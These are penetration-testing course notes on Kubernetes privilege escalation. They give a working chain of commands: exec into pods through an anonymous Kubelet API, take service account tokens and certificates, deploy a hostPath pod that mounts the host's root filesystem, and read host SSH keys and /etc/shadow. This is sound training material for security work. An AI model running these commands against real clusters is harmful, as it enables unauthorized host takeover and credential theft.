# Section 16 — Kubernetes

## ID
534

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 16 — Kubernetes

## Description
Covers Kubernetes architecture, enumeration of the Kubelet API and K8s API server, token/certificate extraction from pods, privilege checking, and privilege escalation by creating a privileged pod that mounts the host filesystem.

## Tags
privesc, kubernetes, k8s, kubelet, containers, pod-escape

## Commands
- curl https://<K8S_API_SERVER>:6443 -k
- curl https://<NODE_IP>:10250/pods -k | jq .
- kubeletctl -i --server <NODE_IP> pods
- kubeletctl -i --server <NODE_IP> scan rce
- kubeletctl -i --server <NODE_IP> exec "<CMD>" -p <POD> -c <CONTAINER>
- kubeletctl -i --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER>
- kubeletctl --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <CONTAINER>
- kubectl --token=$token --certificate-authority=ca.crt --server=https://<API_SERVER>:6443 auth can-i --list
- kubectl --token=$token --certificate-authority=ca.crt --server=https://<API_SERVER>:6443 apply -f privesc.yaml
- kubectl --token=$token --certificate-authority=ca.crt --server=https://<API_SERVER>:6443 get pods

## What This Section Covers
Kubernetes (K8s) is a container orchestration platform with a complex attack surface. If anonymous access to the Kubelet API (port 10250) is enabled, an attacker can enumerate pods, execute commands inside containers, extract service account tokens and certificates, then use those credentials to check permissions and potentially create a new privileged pod that mounts the host filesystem — achieving full host root access without ever having a shell on the host itself.

## Methodology
1. **Probe the K8s API server (6443)** — `curl https://<IP>:6443 -k`. A 403 Forbidden with `system:anonymous` confirms the API is reachable but auth-restricted. This is expected.
2. **Probe the Kubelet API (10250)** — `curl https://<IP>:10250/pods -k | jq .`. If anonymous access is enabled, this returns full pod metadata (names, namespaces, images, UIDs, configs). This is the real entry point.
3. **Enumerate pods with kubeletctl** — `kubeletctl -i --server <IP> pods`. Lists all pods with their namespaces and container names in a clean table.
4. **Scan for RCE-capable pods** — `kubeletctl -i --server <IP> scan rce`. Shows which pods/containers allow command execution (marked with `+` under RCE column).
5. **Execute commands inside a target container** — `kubeletctl -i --server <IP> exec "id" -p nginx -c nginx`. Confirm you're running as root (uid=0) inside the container.
6. **Extract the service account token** — `kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token`. This JWT token authenticates you to the K8s API.
7. **Extract the CA certificate** — `kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt`. Needed for TLS verification against the API server.
8. **Check your permissions** — `export token=$(cat k8.token)` then `kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list`. Look for `pods` with verbs `[get create list]` — that's the escalation path.
9. **Create a privesc pod YAML** that mounts the host root filesystem (see below).
10. **Deploy the pod** — `kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml`.
11. **Verify it's running** — `kubectl ... get pods` and confirm `privesc` shows `Running`.
12. **Extract secrets from the host** — `kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`. The host's `/` is mounted at `/root` inside the container, so host's `/root/.ssh/id_rsa` is at `/root/root/.ssh/id_rsa`.

## Multi-step Workflow (optional)
```
# Step 1 — Enumerate pods via Kubelet API
curl https://<NODE_IP>:10250/pods -k | jq .
kubeletctl -i --server <NODE_IP> pods

# Step 2 — Scan for RCE and confirm root in container
kubeletctl -i --server <NODE_IP> scan rce
kubeletctl -i --server <NODE_IP> exec "id" -p nginx -c nginx

# Step 3 — Extract token and certificate
kubeletctl -i --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
kubeletctl --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

# Step 4 — Check privileges
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://<NODE_IP>:6443 auth can-i --list

# Step 5 — Create and deploy privesc pod
cat <<'EOF' > privesc.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
EOF

kubectl --token=$token --certificate-authority=ca.crt --server=https://<NODE_IP>:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://<NODE_IP>:6443 get pods

# Step 6 — Read host filesystem through the new pod
kubeletctl --server <NODE_IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
kubeletctl --server <NODE_IP> exec "cat /root/etc/shadow" -p privesc -c privesc
```

## K8s Architecture Quick Reference

### Control Plane (Master Node) Ports
| Service | Port | Purpose |
|---|---|---|
| etcd | 2379, 2380 | Cluster state key-value store |
| API Server | 6443 | Main entry point for all admin commands |
| Scheduler | 10251 | Pod scheduling decisions |
| Controller Manager | 10252 | Maintains desired cluster state |
| Kubelet API | 10250 | Node agent — manages pods on worker nodes |
| Read-Only Kubelet API | 10255 | Unauthenticated read-only Kubelet info |

### Key Concepts
- **Pod**: Smallest deployable unit — holds one or more containers, has its own IP.
- **Namespace**: Logical isolation boundary within a cluster (default, kube-system, etc.).
- **Service Account**: Identity assigned to pods for API authentication — token stored at `/var/run/secrets/kubernetes.io/serviceaccount/token`.
- **RBAC**: Role-Based Access Control — defines what actions a service account or user can perform.
- **hostPath volume**: Mounts a directory from the host node's filesystem into a pod — the key to privesc.

### Privesc Pod YAML Breakdown
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc          # Name of your malicious pod
  namespace: default     # Must match the namespace your token has access to
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2  # Must use an image already available on the node
    volumeMounts:
    - mountPath: /root           # Where host's / appears inside the container
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /           # Mounts the ENTIRE host filesystem
  automountServiceAccountToken: true   # Keeps the SA token available
  hostNetwork: true      # Shares the host's network namespace
```

## Key Takeaways
- **Port 10250 (Kubelet API) is the primary target.** If anonymous access is allowed, you can enumerate pods and exec into containers without any credentials at all — this is the most common K8s misconfiguration you'll encounter.
- **The attack chain is: enumerate → exec → extract token/cert → check permissions → create privileged pod → access host filesystem.** Memorize this flow.
- The service account token lives at a fixed path inside every pod: `/var/run/secrets/kubernetes.io/serviceaccount/token`. The CA cert is at the same path as `ca.crt`. Always extract both.
- `auth can-i --list` is the K8s equivalent of `sudo -l` — it tells you exactly what the stolen token is allowed to do. Look for `pods [get create list]` as the green light for privesc.
- The `hostPath` volume type is what makes the escape possible — it maps any host directory into the pod. Combined with `hostNetwork: true`, you have full host access.
- The image specified in the YAML (`nginx:1.14.2`) must already exist on the node — K8s won't pull it if the pod spec or node config uses `imagePullPolicy: Never`. Check what images are running in existing pods and reuse one.
- This is the same fundamental pattern as Docker and LXD privesc: **mount host filesystem into a container you control → read/write as root**. The difference is just the orchestration layer on top.

## Gotchas
- **Path nesting**: If you mount `hostPath: /` to `mountPath: /root` in the container, the host's `/root` directory is at `/root/root/` inside the container — not `/root/`. Adjust your `cat` paths accordingly.
- **Namespace mismatch**: Your stolen token may only have permissions in a specific namespace (e.g., `default`). If you try to create a pod in `kube-system` and get denied, switch to the namespace your token can access.
- `kubeletctl` may not be installed by default — you may need to download it from GitHub (`cyberark/kubeletctl`) and transfer it to the target or run it from your attack box if the Kubelet port is reachable.
- Port 10255 (read-only Kubelet API) gives pod info but no exec capability — you need 10250 for command execution.
- The API server (6443) usually blocks anonymous access — don't waste time there if you get 403. Go straight for Kubelet on 10250.
- If `kubectl` isn't on the target, you can interact with the API server directly via `curl` with the token as a Bearer header: `curl -k -H "Authorization: Bearer $token" https://<IP>:6443/api/v1/namespaces/default/pods`.
